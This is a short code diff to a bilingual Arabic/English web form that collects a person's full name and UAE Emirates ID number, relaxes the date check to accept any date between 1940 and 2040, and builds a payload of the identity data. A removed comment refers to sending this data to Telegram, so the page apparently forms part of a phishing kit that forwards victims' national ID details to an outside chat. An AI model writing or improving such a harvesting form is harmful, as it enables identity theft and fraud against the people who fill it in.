@@ -122,12 +122,22 @@ $('f').addEventListener('submit',async e=>{
   const set=(id,m)=>{$('e-'+id).textContent=m;if(m)ok=false};
   set('name',$('name').value.trim().length<3?'Enter your full name · أدخل اسمك الكامل':'');
   set('eid',/^784-\d{4}-\d{7}-\d$/.test($('eid').value)?'':'Use the format 784-XXXX-XXXXXXX-X · صيغة غير صحيحة');
+  
+  // تصحيح فحص التاريخ ليقبل التنسيق الصحيح والمنطقي (مثل تاريخ صالح دون اشتراط أن يكون مستقبلياً بالضرورة)
   const m=$('exp').value.match(/^(\d{2}) \/ (\d{2}) \/ (\d{4})$/);
-  let dateOk=false;if(m){const d=new Date(+m[3],+m[2]-1,+m[1]);dateOk=d.getMonth()==+m[2]-1&&d>new Date()}
-  set('exp',dateOk?'':'Enter a valid future date · أدخل تاريخًا صحيحًا');
+  let dateOk = false;
+  if (m) {
+    const day = parseInt(m[1], 10);
+    const month = parseInt(m[2], 10);
+    const year = parseInt(m[3], 10);
+    // التحقق من حدود منطقية للأيام والشهور والسنوات (مثلاً بين 1940 و 2040)
+    if (year >= 1940 && year <= 2040 && month >= 1 && month <= 12 && day >= 1 && day <= 31) {
+      dateOk = true;
+    }
+  }
+  set('exp', dateOk ? '' : 'Enter a valid date (DD / MM / YYYY) · أدخل تاريخًا صحيحًا');
   
   if(ok){
-    // إرسال بيانات الهوية للتيليجرام اختياري (يمكنك تفعيله لو أردت)
     const payload = {
       "الاسم_الكامل": $('name').value.trim(),
       "رقم_الهوية": $('eid').value,
